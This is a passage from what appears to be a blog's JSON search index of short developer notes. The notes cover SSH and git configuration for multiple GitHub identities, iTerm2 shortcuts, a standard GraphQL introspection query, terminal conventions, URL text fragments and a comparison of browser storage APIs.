style=\"display:flex;\"\u003e\u003cspan\u003e  HostName github.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  User git\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  IdentityFile ~/.ssh/id_fry_plnx_ed25519\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Instead of the actual URL\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ git clone git@github.com:planet-express/delivery_service.git\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Substitue in our custom Host value for the `github.com` part\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ git clone git@github-plnx:planet-express/delivery_service.git\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"automate-substituting-the-host\"\u003eAutomate Substituting the Host\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003einclude\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  path \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e ~/.gitconfig_custom\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# See custom `Host github-plnx` in ~/.ssh/config\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;github-plnx:planet-express\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  insteadOf \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e git@github.com:planet-express\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","command line","SSH","Github"],"title":"Configuring SSH Keys for Multiple GitHub Accounts"},{"categories":["URL","terminal","iTerm2"],"contents":" iTerm2 features I find useful Show Timestamps ==\u0026gt; ⌘+Shift+E Alert on next prompt ==\u0026gt; ⌘+Option+A Jump between prompts ==\u0026gt; ⌘+Shift+Down Hotkeys to scroll one line at a time ==\u0026gt; ⌘+Up and ⌘+Down Rearrange tabs with hotkeys ==\u0026gt; Ctrl+Shift+B and Ctrl+Shift+F ","date":"February 9, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20250209-iterm2-features-i-find-useful/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://danielde.dev/blog/iterm2-features-i-find-useful\" target=\"_blank\" rel=\"noopener\"\u003eiTerm2 features I find useful\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003col\u003e\n\u003cli\u003eShow Timestamps ==\u0026gt; \u003ccode\u003e⌘+Shift+E\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eAlert on next prompt ==\u0026gt; \u003ccode\u003e⌘+Option+A\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eJump between prompts ==\u0026gt; \u003ccode\u003e⌘+Shift+Down\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eHotkeys to scroll one line at a time ==\u0026gt; \u003ccode\u003e⌘+Up\u003c/code\u003e and \u003ccode\u003e⌘+Down\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eRearrange tabs with hotkeys ==\u0026gt; \u003ccode\u003eCtrl+Shift+B\u003c/code\u003e and \u003ccode\u003eCtrl+Shift+F\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e","tags":["URL","terminal","iTerm2"],"title":"iTerm2 features I find useful"},{"categories":["URL","Go","SonarQube"],"contents":" GitLab CI 可以自動檢測程式碼品質！SonarQube 程式碼品質檢測怎麼做？ Go_GitLab_SonarQube_Example ","date":"February 6, 2025","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20250206-go-sonarqube/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://medium.com/@martina.says/gitlab-ci-%E5%8F%AF%E4%BB%A5%E8%87%AA%E5%8B%95%E6%AA%A2%E6%B8%AC%E7%A8%8B%E5%BC%8F%E7%A2%BC%E5%93%81%E8%B3%AA-sonarqube-%E7%A8%8B%E5%BC%8F%E7%A2%BC%E5%93%81%E8%B3%AA%E6%AA%A2%E6%B8%AC%E6%80%8E%E9%BA%BC%E5%81%9A-7002bd0dcc5a\" target=\"_blank\" rel=\"noopener\"\u003eGitLab CI 可以自動檢測程式碼品質！SonarQube 程式碼品質檢測怎麼做？\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/tedmax100/Go_GitLab_SonarQube_Example\" target=\"_blank\" rel=\"noopener\"\u003eGo_GitLab_SonarQube_Example\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Go","SonarQube"],"title":"GitLab CI 可以自動檢測程式碼品質！SonarQube 程式碼品質檢測怎麼做？"},{"categories":["GraphQL"],"contents":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } } ","date":"January 2, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20250102-gql-introspection-query/","summary":"\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-graphql\" data-lang=\"graphql\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003equery\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eIntrospectionQuery\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  __schema {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003equery\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eType\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003emutation\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eType\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003esubscription\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eType\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003e...\u003c/span\u003eFullType\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003edirective\u003c/span\u003es {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      description\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      locations\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      args {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003e...\u003c/span\u003eInputValue\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efragment\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eFullType\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e __Type {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  kind\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  description\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  fields(includeDeprecated: \u003cspan style=\"color:#a6e22e\"\u003etrue\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    description\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    args {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003e...\u003c/span\u003eInputValue\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003e...\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eTypeRef\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    isDeprecated\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    deprecationReason\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003einput\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eFields\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003e...\u003c/span\u003eInputValue\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003e...\u003c/span\u003eTypeRef\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eenum\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eValues\u003c/span\u003e(includeDeprecated: \u003cspan style=\"color:#a6e22e\"\u003etrue\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    description\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    isDeprecated\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    deprecationReason\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  possibleTypes {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003e...\u003c/span\u003eTypeRef\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efragment\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eInputValue\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e __InputValue {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  description\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003e...\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eTypeRef\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  defaultValue\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efragment\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eTypeRef\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e __Type {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  kind\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  ofType {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    kind\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    ofType {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      kind\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      ofType {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        kind\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ofType {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          kind\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          ofType {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            kind\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            ofType {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              kind\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              ofType {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                kind\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["GraphQL"],"title":"GraphQL Introspection Query"},{"categories":["URL","terminal","command line"],"contents":" \u0026ldquo;Rules\u0026rdquo; that terminal programs follow\n規則 1：非互動程式應在按 Ctrl-C 時退出\n規則 2：按 q 時，TUI 應退出\n規則 3：在空白行上按 Ctrl-D 時，REPL 應退出\n規則 4：不要使用超過 16 種顏色\n規則 5：支援 readline 鍵綁定\n規則 5.1：Ctrl-W 應刪除最後一個單字 規則 6：寫入管道時禁用顏色\n規則 7： - 表示 stdin/stdout\n","date":"December 25, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20241225-terminal-rules/","summary":"\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://jvns.ca/blog/2024/11/26/terminal-rules/\" target=\"_blank\" rel=\"noopener\"\u003e\u0026ldquo;Rules\u0026rdquo; that terminal programs follow\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e規則 1：非互動程式應在按 Ctrl-C 時退出\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e規則 2：按 q 時，TUI 應退出\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e規則 3：在空白行上按 Ctrl-D 時，REPL 應退出\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e規則 4：不要使用超過 16 種顏色\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e規則 5：支援 readline 鍵綁定\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e規則 5.1：Ctrl-W 應刪除最後一個單字\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e規則 6：寫入管道時禁用顏色\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e規則 7： - 表示 stdin/stdout\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","terminal","command line"],"title":"Rules that terminal programs follow"},{"categories":["URL","web","browser"],"contents":" Smarter than \u0026lsquo;Ctrl+F\u0026rsquo;: Linking Directly to Web Page Content syntax\nhttps://example.com/page.html#:~:text=[prefix-,]textStart[,textEnd][,-suffix]\nexample\nhttps://developer.mozilla.org/en-US/docs/Web/URI/Fragment/Text_fragments#:~:text=without%20relying%20on%20the%20presence%20of%20IDs\n","date":"December 25, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20241225-linking-directly-to-web-page-content/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://alfy.blog/2024/10/19/linking-directly-to-web-page-content.html\" target=\"_blank\" rel=\"noopener\"\u003eSmarter than \u0026lsquo;Ctrl+F\u0026rsquo;: Linking Directly to Web Page Content\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003esyntax\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ehttps://example.com/page.html#:~:text=[prefix-,]textStart[,textEnd][,-suffix]\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eexample\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ehttps://developer.mozilla.org/en-US/docs/Web/URI/Fragment/Text_fragments#:~:text=without%20relying%20on%20the%20presence%20of%20IDs\u003c/code\u003e\u003c/p\u003e","tags":["URL","web","browser"],"title":"Smarter than 'Ctrl+F': Linking Directly to Web Page Content"},{"categories":["URL","Browser"],"contents":" LocalStorage vs. IndexedDB vs. Cookies vs. OPFS vs. WASM-SQLite The available Storage APIs in a modern Browser Cookies\nCookies store small pieces of key-value data that are mainly used for session management, personalization, and tracking. Cookies can have several security settings like a time-to-live or the domain attribute to share the cookies between several subdomains.\nLocalStorage\nLocalStorage is only suitable for storing small amounts of data that need to persist across sessions and it is limited by a 5MB storage cap. Storing complex data is only possible by transforming it into a string for example with JSON.stringify(). The API is not asynchronous which means if fully blocks your JavaScript process while doing stuff. Therefore running heavy operations on it might block your UI from rendering.\nIndexedDB\nIndexedDB is a low-level API for storing large amounts of structured JSON data. While the API is a bit hard to use, IndexedDB can utilize indexes and asynchronous operations. It lacks support for complex queries and only allows to iterate over the indexes which makes it more like a base layer for other libraries then a fully fledged database.\nStorage Size Limits Technology Limits Cookie 4 KB LocalStorage 4 MB to 10 MB per origin IndexedDB depends on the browser implementation OPFS depends on the available disc space Performance Comparison Initialization Time Technology Time in Milliseconds IndexedDB 46 OPFS Main Thread 23 OPFS WebWorker 26.8 WASM SQLite (memory) 504 WASM SQLite (IndexedDB) 535 Latency of small Writes Technology Time in Milliseconds Cookies 0.058 LocalStorage 0.017 IndexedDB 0.17 OPFS Main Thread 1.46 OPFS WebWorker 1.54 WASM SQLite (memory) 0.17 WASM SQLite (IndexedDB) 3.17 Latency of small Reads Technology Time in Milliseconds Cookies 0.132 LocalStorage 0.0052 IndexedDB 0.1 OPFS Main Thread 1.28 OPFS WebWorker 1.41 WASM SQLite (memory) 0.45 WASM SQLite (IndexedDB) 2.93 ","date":"November 29, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20241129-localstorage-indexeddb-cookies-opfs-sqlite-wasm/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://rxdb.info/articles/localstorage-indexeddb-cookies-opfs-sqlite-wasm.html\" target=\"_blank\" rel=\"noopener\"\u003eLocalStorage vs. IndexedDB vs. Cookies vs. OPFS vs. WASM-SQLite\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"the-available-storage-apis-in-a-modern-browser\"\u003eThe available Storage APIs in a modern Browser\u003c/h4\u003e\n\u003cp\u003e\u003cstrong\u003e\u003cem\u003eCookies\u003c/em\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eCookies store small pieces of key-value data that are mainly used for session management, personalization, and tracking. Cookies can have several security settings like a time-to-live or the domain attribute to share the cookies between several subdomains.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003cem\u003eLocalStorage\u003c/em\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eLocalStorage is only suitable for storing small amounts of data that need to persist across sessions and it is limited by a 5MB storage cap. Storing complex data is only possible by transforming it into a string for example with JSON.stringify(). The API is not asynchronous which means if fully blocks your JavaScript process while doing stuff. Therefore running heavy operations on it might block your UI from rendering.\u003c/p\u003e","tags":["URL","Browser"],"title":"LocalStorage vs. IndexedDB vs. Cookies vs. OPFS vs. WASM-SQLite"},{"categories":["URL","Git"],"contents":" How I configure my Git identities includeIf\n[includeIf \u0026#34;gitdir:~/code/**\u0026#34;] path = ~/.config/git/personal [includeIf \u0026#34;gitdir:~/work/**\u0026#34;] path = ~/.config/git/work hasconfig:remote.*.url:\n[includeIf \u0026#34;hasconfig:remote.*.url:git@github.com:*/**\u0026#34;] path = ~/.config/git/config-gh [includeIf \u0026#34;hasconfig:remote.*.url:git@github.com:orgname/**\u0026#34;] path = ~/.config/git/config-gh-org [includeIf \u0026#34;hasconfig:remote.*.url:git@gitlab.com:*/**\u0026#34;] path = ~/.config/git/config-gl [includeIf \u0026#34;hasconfig:remote.*.url:git@git.sr.ht:*/**\u0026#34;] path = ~/.config/git/config-srht insteadOf\n[url \u0026#34;gh-work:orgname\u0026#34;] insteadOf = git@github.com:orgname ","date":"November 25, 2024","hero":"/images/hero/git.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20241125-git-config/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.benji.dog/articles/git-config/\" target=\"_blank\" rel=\"noopener\"\u003eHow I configure my Git identities\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e\u003cem\u003eincludeIf\u003c/em\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e[includeIf \u0026#34;gitdir:~/code/**\u0026#34;]\n  path = ~/.config/git/personal\n[includeIf 